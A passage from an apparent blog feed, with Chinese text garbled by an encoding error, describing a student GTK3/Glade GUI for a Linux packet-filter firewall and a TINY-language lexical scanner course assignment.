QuickæŠ€æœ¯ï¼Œå…è®¸å¼€å‘è€…ä½¿ç”¨å£°æ˜æ€§è¯­è¨€å’Œç»„ä»¶åŒ–çš„æ–¹å¼æ¥è®¾è®¡å’Œæ„å»ºç”¨æˆ·ç•Œé¢ã€‚è¿™ç§æ–¹å¼ç®€åŒ–äº†UIè®¾è®¡å’Œå¼€å‘çš„è¿‡ç¨‹ï¼Œå¹¶æä¾›äº†è‰¯å¥½çš„å¯æ‰©å±•æ€§ã€‚</li><li>å•†ä¸šæ”¯æŒï¼šQTç”±The Qt Companyå¼€å‘å’Œç»´æŠ¤ï¼Œæä¾›äº†å•†ä¸šè®¸å¯å’Œæ”¯æŒæœåŠ¡ã€‚è¿™å¯¹äºä¼ä¸šçº§åº”ç”¨å¼€å‘æ¥è¯´æ˜¯ä¸€ä¸ªä¼˜åŠ¿ï¼Œå› ä¸ºä»–ä»¬å¯ä»¥è·å¾—ä¸“ä¸šçš„æŠ€æœ¯æ”¯æŒå’Œä¿éšœã€‚</li></ol></li><li>GTKï¼š<ol><li>å¼€æºæ€§ï¼šGTKæ˜¯ä¸€ä¸ªå¼€æºå·¥å…·åŒ…ï¼Œå®ƒçš„ä»£ç å¯ä»¥è¢«è‡ªç”±åœ°æŸ¥çœ‹ã€ä¿®æ”¹å’Œåˆ†å‘ã€‚è¿™å¯¹äºå¼€æºç¤¾åŒºå’Œä¸ªäººå¼€å‘è€…æ¥è¯´æ˜¯ä¸€ä¸ªä¼˜åŠ¿ï¼Œä»–ä»¬å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚è¿›è¡Œè‡ªå®šä¹‰å’Œæ”¹è¿›ã€‚</li><li>UNIXå“²å­¦ï¼šGTKæ˜¯åŸºäºUNIXå“²å­¦è®¾è®¡çš„ï¼Œå®ƒé¼“åŠ±æ¨¡å—åŒ–å’Œç®€æ´çš„è®¾è®¡ã€‚è¿™ç§è®¾è®¡ç†å¿µä½¿å¾—GTKåœ¨Linuxç­‰UNIX-likeç³»ç»Ÿä¸Šæœ‰ç€å¾ˆå¥½çš„é›†æˆå’Œå…¼å®¹æ€§ã€‚</li><li>GNOMEé›†æˆï¼šGTKæ˜¯GNOMEæ¡Œé¢ç¯å¢ƒçš„é»˜è®¤å·¥å…·åŒ…ï¼Œå®ƒä¸GNOMEçš„é›†æˆéå¸¸ç´§å¯†ã€‚å¦‚æœä½ è®¡åˆ’å¼€å‘é€‚ç”¨äºGNOMEæ¡Œé¢ç¯å¢ƒçš„åº”ç”¨ç¨‹åºï¼Œä½¿ç”¨GTKå¯èƒ½æ›´åŠ æ–¹ä¾¿å’Œè‡ªç„¶ã€‚</li><li>å¤šè¯­è¨€æ”¯æŒï¼šGTKæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼ŒåŒ…æ‹¬Cã€C++ã€Pythonç­‰ã€‚è¿™ä½¿å¾—å¼€å‘è€…å¯ä»¥ä½¿ç”¨è‡ªå·±å–œæ¬¢çš„ç¼–ç¨‹è¯­è¨€æ¥è¿›è¡Œåº”ç”¨ç¨‹åºçš„å¼€å‘ã€‚</li></ol></li></ul><p>æœ€ç»ˆæˆ‘æ˜¯é€‰æ‹©äº†GTK3è¿›è¡ŒGUIå¼€å‘ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><ol><li>è¿™æ¬¡å¼€å‘çš„é˜²ç«å¢™ç¨‹åºæ˜¯åŸºäºLinuxå†…æ ¸æ¨¡å—çš„ï¼Œæ‰€ä»¥åªèƒ½åœ¨Linuxç³»ç»Ÿä½¿ç”¨ï¼Œä¸éœ€è¦è€ƒè™‘GUIçš„è·¨å¹³å°ã€‚</li><li><a href="https://help.gnome.org/users/glade3/">Glade</a>åº”ç”¨æä¾›äº†GTKåº”ç”¨çš„UIè®¾è®¡åŠŸèƒ½ï¼Œèµ·åˆ°å’ŒQMLã€Qt Quickç±»ä¼¼çš„ä½œç”¨ã€‚</li><li>å¼€æºã€ä¸éœ€è¦å•†ä¸šæ”¯æŒã€‚</li><li>é˜²ç«å¢™å±äºç½‘ç»œå±‚çš„åº”ç”¨ï¼Œä¸éœ€è¦å¤ªå¤šåŠŸèƒ½ï¼Œç®€æ´è‡³ä¸Šã€‚</li><li>åœ¨Ubuntu22.04ç¯å¢ƒä¸‹å¼€å‘ï¼Œä½¿ç”¨GTKæ¥è¿‘åŸç”ŸUIã€‚</li><li>GTKçš„é»˜è®¤æ ·å¼è¶³å¤Ÿå¥½çœ‹ã€‚</li></ol><h2 id="GTK-amp-gladeå­¦ä¹ "><a href="#GTK-amp-gladeå­¦ä¹ " class="headerlink" title="GTK &amp; gladeå­¦ä¹ "></a>GTK &amp; gladeå­¦ä¹ </h2><p>GTKç›¸æ¯”QTçš„ä¸€ä¸ªæœ€å¤§åŠ£åŠ¿å°±æ˜¯æ–‡æ¡£æ›´å°‘ã€ç¤¾åŒºä¹Ÿæ›´ä¸æ´»è·ƒã€‚Bç«™å’ŒYouTubeæœç´¢QTï¼Œæœ‰éå¸¸å¤šçš„æ•™ç¨‹ï¼Œè€ŒGTKç›¸å¯¹æ¥è¯´å°±æ¯”è¾ƒå°‘äº†ã€‚å¦å¤–GTK4å·²ç»é—®ä¸–æ•°å¹´ï¼Œä½†æ˜¯æ•™ç¨‹å¤§å¤šè¿˜æ˜¯GTK3ã€‚ä¹‹å‰æåˆ°ç”¨æ¥è®¾è®¡GTKåº”ç”¨UIçš„gladeï¼Œæ”¯æŒçš„æœ€é«˜GTKç‰ˆæœ¬ä¹Ÿæ˜¯GTK3ã€‚</p><p>å¥½åœ¨å¯¹äºè¿™æ ·ä¸€ä¸ªç®€å•çš„GUIåº”ç”¨ï¼Œåªéœ€è¦å…¥é—¨GTKä¾¿å¯ã€‚å­¦ä¹ ä¸€æ ·å·¥å…·ï¼Œæˆ‘æ€»æ˜¯å–œæ¬¢è¾¹å­¦è¾¹åšã€‚å› æ­¤è§†é¢‘+æ–‡æ¡£çš„ç»„åˆå¾€å¾€æ˜¯æ›´é€‚åˆæˆ‘çš„ã€‚åœ¨æˆ‘å­¦ä¹ GTKå¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œä¸»è¦å‚è€ƒäº†ä»¥ä¸‹èµ„æºï¼š</p><ol><li><p><a href="https://www.youtube.com/watch?v=g-KDOH_uqPk&amp;list=PLmMgHNtOIstZEvqYJncYUx52n8_OV0uWy">Linux Gtk Glade Programming</a></p><p>YouTubeä¸Šçš„GTK &amp; gladeå¼€å‘æ•™ç¨‹ï¼Œæ²¡æœ‰æ¶µç›–GTKçš„æ‰€æœ‰ç±»ï¼Œä½†å¯¹å…¥é—¨æ¥è¯´å¤Ÿç”¨è€Œä¸”å‹å¥½ã€‚</p></li><li><p><a href="https://www.cs.uni.edu/~okane/Code/Glade%20Cookbook/">è§†é¢‘ä¸­çš„æºä»£ç </a></p><p>æ›´å¤šæ—¶å€™æˆ‘å…¶å®æ˜¯ç›´æ¥çœ‹æºä»£ç å­¦ä¹ ï¼Œè§†é¢‘èŠ‚å¥æœ‰äº›æ‹–æ²“ï¼Œä¸€æ—¦ç†è§£GTKå’Œgladeæ˜¯æ€æ ·å·¥ä½œçš„ï¼Œçœ‹ä»£ç ä¼šæ˜¯æ›´é«˜æ•ˆçš„è§£å†³æ–¹æ³•ã€‚</p></li><li><p><a href="https://docs.gtk.org/gtk3/">GTK3æ–‡æ¡£</a></p><p>æ–‡æ¡£å¾ˆå…¨é¢ï¼Œä½†åªæœ‰è‹±æ–‡ã€‚</p></li><li><p>ChatGPT</p><p>æ–‡æ¡£æ²¡å†™å…¨çš„ã€è§†é¢‘æ²¡è®²åˆ°çš„å¯ä»¥é—®é—®GPTã€‚çœ‹çœ‹æ€è·¯å¯ä»¥ï¼Œ3.5å†™å‡ºæ¥çš„ä»£ç å¯èƒ½ä¸èƒ½ç›´æ¥ç”¨ã€‚</p></li></ol><h2 id="GTK-amp-gladeå¼€å‘æµç¨‹"><a href="#GTK-amp-gladeå¼€å‘æµç¨‹" class="headerlink" title="GTK &amp; gladeå¼€å‘æµç¨‹"></a>GTK &amp; gladeå¼€å‘æµç¨‹</h2><p>ä½¿ç”¨GTK &amp; gladeå¼€å‘ï¼Œä¸»è¦æ˜¯åº”ç”¨UIè®¾è®¡å’ŒåŠŸèƒ½å®ç°åˆ†ç¦»çš„æ€æƒ³ã€‚</p><ol><li><p>åœ¨gladeåº”ç”¨ä¸­è®¾è®¡UI</p><p>å“ªé‡Œæ˜¯æŒ‰é’®ï¼Œå“ªé‡Œéœ€è¦è¾“å…¥æ¡†ï¼Œå“ªé‡Œéœ€è¦åˆ—è¡¨ç­‰ç­‰ï¼Œéœ€è¦æå‰æ„æ€å¥½ã€‚</p></li><li><p>åœ¨gladeåº”ç”¨ä¸­è¿æ¥ä¿¡å·ï¼ˆsignalsï¼‰</p><p>æ‰€è°“ä¿¡å·ï¼Œå°±æ˜¯å½“ç”¨æˆ·ä¸ç•Œé¢å‘ç”ŸæŸç§ç‰¹å®šçš„äº¤äº’æ—¶ï¼Œåº”ç”¨ç¨‹åºä¾¿ä¼šçŸ¥æ‚‰ï¼Œå¹¶å¯æ ¹æ®è¿™ç§ä¿¡å·å›è°ƒå¯¹åº”çš„å‡½æ•°ã€ä¼ å…¥ç‰¹å®šçš„æ•°æ®è¿›è¡Œç‰¹å®šçš„æ“ä½œã€‚å¯ä»¥åœ¨gladeä¸­è¿æ¥ä¿¡å·å¹¶æŒ‡å®šå¯¹åº”çš„å›è°ƒå‡½æ•°ï¼Œä»¥åŠéœ€è¦ä¼ å…¥çš„æ•°æ®ã€‚è¿™æ ·åœ¨åç»­åŠŸèƒ½å®ç°æ—¶ï¼Œåªéœ€å°†è¿™äº›å‡½æ•°çš„åŠŸèƒ½å®ç°å³å¯ï¼Œä¹Ÿå¾ˆå¥½åœ°å®ç°äº†æ¨¡å—åŒ–ã€‚</p></li><li><p>ç¼–å†™GTKä»£ç </p><p>ä¸»è¦æ˜¯å®ç°ä¹‹å‰åœ¨gladeä¸­æŒ‡å®šçš„å›è°ƒå‡½æ•°ã€‚å¦å¤–ï¼Œä¸€äº›ç”¨äºæç¤ºç”¨æˆ·çš„å¯¹è¯æ¡†ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ä»£ç ç”Ÿæˆã€‚</p></li><li><p>ç¼–è¯‘ç¨‹åº</p><p>åœ¨å¼€å‘é˜¶æ®µï¼Œä¸€èˆ¬ä»gladeæ–‡ä»¶åŠ è½½builderï¼ˆgtk_builder_new_from_fileï¼‰ï¼Œå¹¶ä½¿ç”¨<code>gcc</code>çš„<code>-export-dynamic</code>å‚æ•°ã€‚è¿™æ ·ä¸€æ¥ï¼Œä¿®æ”¹gladeæ–‡ä»¶åæ— éœ€é‡æ–°ç¼–è¯‘å°±å¯ä»¥çœ‹åˆ°æ–°çš„UIã€‚</p><p>è€Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œä¸èƒ½ä½¿ç”¨ä¸Šè¿°æ–¹æ³•ã€‚å› ä¸ºä¸Šè¿°æ–¹æ³•ç¼–è¯‘çš„åº”ç”¨ç¨‹åºéœ€è¦ä¾èµ–gladeæ–‡ä»¶è¿è¡Œï¼Œè€Œä¸€èˆ¬ç”¨äºç”Ÿäº§ç¯å¢ƒçš„åº”ç”¨ç¨‹åºéœ€è¦å°†gladeæ–‡ä»¶ä¸€åŒç¼–è¯‘æˆæœ€åçš„äºŒè¿›åˆ¶ç¨‹åºã€‚å› æ­¤è¦ä»èµ„æºä¸­åŠ è½½builderï¼ˆgtk_builder_new_from_resourceï¼‰ã€‚å› æ­¤é¦–å…ˆè¦æŠŠgladeæ–‡ä»¶ç¼–è¯‘æˆèµ„æºï¼Œè¿™ä¸ªè¿‡ç¨‹éœ€è¦ç”¨åˆ°<code>glib-compile-resources</code>å·¥å…·ã€‚å…·ä½“æ–¹æ³•å¯ä»¥å‚ç…§<a href="https://www.youtube.com/watch?v=HCCpBtiR46A&amp;list=PLmMgHNtOIstZEvqYJncYUx52n8_OV0uWy&amp;index=33">Linux Gtk Glade Programming Part 34: Embedding resources in your app</a>ã€‚</p></li></ol><h2 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h2><ol><li><p>TreeView</p><p>GTKä¸­çš„TreeViewä»¥åŠListBoxæ˜¯éå¸¸é‡è¦çš„ç»„ä»¶ï¼Œé€‚åˆç”¨äºç”¨æˆ·ä¸ç³»ç»Ÿçš„æ•°æ®äº¤äº’ï¼ŒåŒºåˆ«åœ¨äºTreeViewå¯ä»¥æœ‰å¤šå±‚çˆ¶å­ç»“æ„ï¼Œè€ŒListBoxåªæœ‰å•å±‚ã€‚</p></li><li><p>LogåŠŸèƒ½</p><p>LogåŠŸèƒ½çš„ç¬¬ä¸€ç‰ˆæ€æƒ³æ˜¯ï¼šæ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆå¦‚1sï¼‰ç›‘æµ‹æ—¥å¿—æ–‡ä»¶çš„å˜åŒ–ï¼Œå½“æ—¥å¿—æ–‡ä»¶å¤§å°å‘ç”Ÿæ”¹å˜æ—¶ï¼Œå°†æ–°å¢çš„å†…å®¹æ˜¾ç¤ºåœ¨åº”ç”¨çš„TextViewå½“ä¸­ã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹ï¼Œä¼šå¯¼è‡´åº”ç”¨è¦è½®æµå¤„ç†ä¸ç”¨æˆ·çš„äº¤äº’å’Œæ—¥å¿—æ–‡ä»¶çš„ç›‘æµ‹ï¼Œè€Œæ—¥å¿—æ–‡ä»¶åˆéœ€è¦é¢‘ç¹ç›‘æµ‹ï¼Œé€ æˆè¾ƒå·®çš„ç”¨æˆ·ä½“éªŒã€‚å› æ­¤ä¸ºç›‘æµ‹æ—¥å¿—æ–‡ä»¶å˜åŒ–çš„åŠŸèƒ½å•ç‹¬åˆ›å»ºä¸€ä¸ªçº¿ç¨‹è¿›è¡Œå¤„ç†ã€‚</p><p>ä½†æ˜¯çº¿ç¨‹éœ€è¦åº”å¯¹ä¸€ç³»åˆ—äº’æ–¥ä¸å…±äº«çš„é—®é¢˜ï¼Œå› æ­¤æˆ‘æ¢äº†ä¸€ç§å®ç°æ–¹æ³•ã€‚</p><p>ç¬¬äºŒç‰ˆçš„æ€æƒ³æ˜¯ï¼šä½¿ç”¨<code>GFileMonitor</code>æ¥ç›‘æµ‹æ–‡ä»¶çš„å˜åŒ–ï¼Œå½“æ–‡ä»¶å˜åŒ–æ—¶ï¼Œä¼šå‘å‡ºä¸€ä¸ªä¿¡å·ï¼ŒGTKåº”ç”¨èƒ½æ•æ‰è¿™ä¸ªä¿¡å·å¹¶åšå‡ºç›¸åº”çš„å¤„ç†ã€‚</p><p><code>GFileMonitor</code> VS å¤šçº¿ç¨‹ï¼š</p><ul><li><p>ä¼˜ç‚¹:</p><ul><li>GFileMonitorä½¿ç”¨æ›´ç®€å•,ä¸éœ€è¦è‡ªå·±ç¼–å†™å¤šçº¿ç¨‹é€»è¾‘ã€‚å®ƒæä¾›äº†æ–‡ä»¶å˜åŒ–äº‹ä»¶çš„å›è°ƒæ¥å£,åªéœ€è¦å…³å¿ƒäº‹ä»¶å¤„ç†é€»è¾‘ã€‚</li><li>GFileMonitorå¯¹æ–‡ä»¶ç³»ç»Ÿäº‹ä»¶çš„å¤„ç†å¯èƒ½æ›´é«˜æ•ˆã€‚å®ƒåŸºäºæ“ä½œç³»ç»Ÿæä¾›çš„æ–‡ä»¶å˜åŒ–ç›‘æ§æœºåˆ¶,ä¸éœ€è¦é¢‘ç¹åœ°è½®è¯¢æ£€æŸ¥æ–‡ä»¶ã€‚</li><li>GFileMonitorå¯ä»¥æ–¹ä¾¿åœ°è·¨å¹³å°ä½¿ç”¨,è€Œè‡ªè¡Œå®ç°çš„å¤šçº¿ç¨‹æ–‡ä»¶ç›‘è§†å¯èƒ½éœ€è¦é’ˆå¯¹ä¸åŒå¹³å°è°ƒæ•´ã€‚</li></ul></li><li><p>ç¼ºç‚¹:</p><ul><li>GFileMonitorçš„å¯å®šåˆ¶æ€§è¾ƒä½,ä¸èƒ½è‡ªç”±æ§åˆ¶è½®è¯¢é¢‘ç‡ç­‰å‚æ•°ã€‚</li><li>GFileMonitorå¯èƒ½ä¸æ”¯æŒç›‘è§†ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿæˆ–ä¸€äº›ç‰¹æ®Šæ–‡ä»¶ç³»ç»Ÿã€‚</li><li>GFileMonitoråŸºäºç³»ç»Ÿè°ƒç”¨,ç³»ç»Ÿå¼€é”€å¯èƒ½ç•¥å¤§äºçº¯ç”¨æˆ·æ€çš„å¤šçº¿ç¨‹å®ç°ã€‚</li><li>è‡ªè¡Œå®ç°çš„å¤šçº¿ç¨‹æ–¹æ¡ˆå¯ä»¥åŠ å…¥æ›´å¤šè‡ªå®šä¹‰é€»è¾‘,ä¾‹å¦‚åˆå¹¶äº‹ä»¶ã€ç¼“å­˜ç­‰ã€‚</li></ul></li></ul></li></ol><h2 id="æºä»£ç ï¼ˆå®Œæ•´ç¨‹åºï¼‰"><a href="#æºä»£ç ï¼ˆå®Œæ•´ç¨‹åºï¼‰" class="headerlink" title="æºä»£ç ï¼ˆå®Œæ•´ç¨‹åºï¼‰"></a>æºä»£ç ï¼ˆå®Œæ•´ç¨‹åºï¼‰</h2><div class="tag link"><a class="link-card" title="VersaGuard-FireWall" href="https://github.com/BeaCox/VersaGuard-Firewall"><div class="left"><img src="https://github.githubassets.com/favicons/favicon.svg" class="lazyload" data-srcset="https://github.githubassets.com/favicons/favicon.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">VersaGuard-FireWall</p><p class="url">https://github.com/BeaCox/VersaGuard-Firewall</p></div></a></div>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¤å­£å­¦æœŸè¯¾ç¨‹çš„å°ç»„ä½œä¸šï¼Œæ˜¯è¦å¼€å‘ä¸€ä¸ªåŸºäºLinuxå†…æ ¸æ¨¡å—çš„åŒ…è¿‡æ»¤é˜²ç«å¢™ã€‚ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†çš„ä»»åŠ¡ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;é…ç½®ç¨‹åº&lt;/p&gt;
&lt;p&gt;è¿è¡Œåœ¨åº”ç”¨å±‚ï¼Œç”¨æ¥é…ç½®è¿‡æ»¤è§„åˆ™ï¼ŒåŒ…æ‹¬åè®®ç±»å‹ã€IPåœ°å€ã€ç«¯å£å·ã€å¼€å§‹å’Œç»“æŸæ—¶é—´ã€æ˜¯å¦å¯ç”¨è§„åˆ™ç­‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;l</summary>
      
    
    
    
    <category term="é¡¹ç›®" scheme="https://blog.beacox.space/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="C" scheme="https://blog.beacox.space/tags/C/"/>
    
    <category term="è®¾è®¡" scheme="https://blog.beacox.space/tags/%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>TINY Scannerå¼€å‘æ–‡æ¡£</title>
    <link href="https://blog.beacox.space/posts/TINY-Scanner/"/>
    <id>https://blog.beacox.space/posts/TINY-Scanner/</id>
    <published>2023-05-29T13:37:58.000Z</published>
    <updated>2024-05-13T11:49:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>NIS2336ç¼–è¯‘åŸç†è¯¾ç¨‹çš„å¤§(?)ä½œä¸šã€‚<span id="more"></span></p><p>ä»£ç ä»“åº“ï¼š</p><div class="tag link"><a class="link-card" title="NIS2336_lexical_analysis" href="https://github.com/BeaCox/NIS2336_lexical_analysis"><div class="left"><img src="https://github.githubassets.com/favicons/favicon.svg" class="lazyload" data-srcset="https://github.githubassets.com/favicons/favicon.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></div><div class="right"><p class="text">NIS2336_lexical_analysis</p><p class="url">https://github.com/BeaCox/NIS2336_lexical_analysis</p></div></a></div><p>è¦æ±‚å¦‚ä¸‹ï¼š</p><h3 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h3><p>äº†è§£TINY languageè¯­è¨€ï¼Œå¹¶èƒ½ç”¨TINY languageå†™è¾ƒç®€å•çš„ç¨‹åºï¼›<br>æŒæ¡è¯æ³•åˆ†æçš„æ­¥éª¤æ–¹æ³•ï¼Œèƒ½æ ¹æ®ç¨‹åºæ®µæ¨¡æ‹Ÿè‡ªåŠ¨æœºçš„åˆ†æè¿‡ç¨‹ç”Ÿæˆtokenåºåˆ—ã€‚</p><h3 id="TINY-languageè¯æ³•åˆ†æåŠŸèƒ½è¯´æ˜"><a href="#TINY-languageè¯æ³•åˆ†æåŠŸèƒ½è¯´æ˜" class="headerlink" title="TINY languageè¯æ³•åˆ†æåŠŸèƒ½è¯´æ˜"></a>TINY languageè¯æ³•åˆ†æåŠŸèƒ½è¯´æ˜</h3><p>TINY languageè¯­è¨€çš„è¯æ³•å•å…ƒï¼š</p><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t20250528/202950/18/35758/12997/6474b236F007bf7d3/31aba0e5087ac301.png" data-fancybox="default" data-caption="è¯æ³•å•å…ƒ"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t20250528/202950/18/35758/12997/6474b236F007bf7d3/31aba0e5087ac301.png" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t20250528/202950/18/35758/12997/6474b236F007bf7d3/31aba0e5087ac301.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="è¯æ³•å•å…ƒ"></a><span class="image-caption">è¯æ³•å•å…ƒ</span></div></div><p>  æ–‡ä»¶global.hä¸­å®šä¹‰äº†æ‰€æœ‰çš„è¯æ³•å•å…ƒç±»å‹TokenTypeï¼Œå¹¶åœ¨lexer.hä¸­å£°æ˜ã€‚æœ¬æ¬¡å®éªŒè¦æ±‚åœ¨è¯»æ‡‚lexer.cä¸­å·²æœ‰ä»£ç çš„åŸºç¡€ä¸Šå®Œå–„è¡¥å…¨lexer.cä¸­çš„ä¸»å‡½æ•°getToken(void)ï¼Œè¯¥å‡½æ•°é€šè¿‡åˆ¤æ–­å½“å‰çŠ¶æ€å¹¶æ ¹æ®å½“å‰è¯»å…¥çš„è¯æ³•å•å…ƒæ¥è¾“å‡ºå½“å‰è¯»å…¥è¯æ³•å•å…ƒçš„tokenï¼Œå¹¶æ›´æ–°çŠ¶æ€å’Œè¯æ³•å•å…ƒï¼Œæ ¹æ®ç»™å‡ºä»£ç ä¸­çš„ç¤ºä¾‹è¡¥å…¨switchè¯­å¥ä¸­caseä¸ºå…¶ä»–çŠ¶æ€æ—¶çš„æƒ…å†µã€‚</p><h3 id="å¤„ç†ç»“æœè¦æ±‚"><a href="#å¤„ç†ç»“æœè¦æ±‚" class="headerlink" title="å¤„ç†ç»“æœè¦æ±‚"></a>å¤„ç†ç»“æœè¦æ±‚</h3><p>ç»™å®šä¸€æ®µç¬¦åˆTINY languageè¯­æ³•çš„ä»£ç ï¼Œå†™æˆ.tnyæ–‡ä»¶ï¼Œæ”¾åœ¨build\testæ–‡ä»¶å¤¹å†…ã€‚è¦æ±‚ç¨‹åºèƒ½å¤Ÿè¾“å‡ºè¿™æ®µä»£ç çš„æ¯ä¸€è¡Œï¼Œåœ¨æ¯ä¸€è¡Œçš„åé¢è¾“å‡ºè¿™ä¸€è¡Œæ‰€æœ‰è¯æ³•å•å…ƒçš„tokenã€‚</p><p>ç¤ºä¾‹è¾“å…¥å’Œè¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">read x</span><br><span class="line"></span><br><span class="line">if 0 &lt; x then </span><br><span class="line"></span><br><span class="line">  fac := 1</span><br><span class="line"></span><br><span class="line">  repeat</span><br><span class="line"></span><br><span class="line">   fact := fact * x</span><br><span class="line"></span><br><span class="line">   x := x â€“ 1 until x = 0</span><br><span class="line"></span><br><span class="line">  write fac</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></tbody></table></figure><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t20250528/210077/11/35347/15660/6474b26cFbc20fc61/3d0989a21c5b063a.jpg" data-fancybox="default" data-caption="example1"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t20250528/210077/11/35347/15660/6474b26cFbc20fc61/3d0989a21c5b063a.jpg" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t20250528/210077/11/35347/15660/6474b26cFbc20fc61/3d0989a21c5b063a.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="example1"></a><span class="image-caption">example1</span></div><p></p><p></p><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t20250528/119582/34/36885/18294/6474b289F233daf4c/08d352815bc9a362.jpg" data-fancybox="default" data-caption="example2"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t20250528/119582/34/36885/18294/6474b289F233daf4c/08d352815bc9a362.jpg" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t20250528/119582/34/36885/18294/6474b289F233daf4c/08d352815bc9a362.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="example2"></a><span class="image-caption">example2</span></div></div><h3 id="æäº¤è¦æ±‚å’Œæ–¹æ³•"><a href="#æäº¤è¦æ±‚å’Œæ–¹æ³•" class="headerlink" title="æäº¤è¦æ±‚å’Œæ–¹æ³•"></a>æäº¤è¦æ±‚å’Œæ–¹æ³•</h3><p>  æœ¬æ¬¡å®éªŒåªå¯¹lexer.cè¿›è¡Œä¿®æ”¹ï¼Œå…¶ä»–æ–‡ä»¶ä¸è¿›è¡Œä¿®æ”¹ã€‚åœ¨æäº¤æ—¶åªéœ€å°†ä¿®æ”¹å®Œå–„åçš„lexer.cä¸Šä¼ å³å¯ã€‚</p><h2 id="DFA"><a href="#DFA" class="headerlink" title="DFA"></a>DFA</h2><div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://kjimg10.360buyimg.com/ott/jfs/t20250528/114300/2/39521/24786/6474b260Fae367d1e/3a09aa34620c1b2b.jpg" data-fancybox="default" data-caption="DFA"><img fancybox="" itemprop="contentUrl" src="https://kjimg10.360buyimg.com/ott/jfs/t20250528/114300/2/39521/24786/6474b260Fae367d1e/3a09aa34620c1b2b.jpg" class="lazyload" data-srcset="https://kjimg10.360buyimg.com/ott/jfs/t20250528/114300/2/39521/24786/6474b260Fae367d1e/3a09aa34620c1b2b.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="DFA"></a><span class="image-caption">DFA</span></div></div><p>å¼€å§‹çŠ¶æ€ä¸º<code>START</code>ï¼Œç»ˆæ­¢çŠ¶æ€ä¸º<code>DONE</code>ã€‚<br>ä»<code>START</code>çŠ¶æ€è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªçŠ¶æ€ï¼Œåªéœ€è¦åˆ¤å®šä¸‹ä¸€ä¸ªè¯»å…¥çš„å­—ç¬¦å³å¯ã€‚</p><h2 id="ERROR"><a href="#ERROR" class="headerlink" 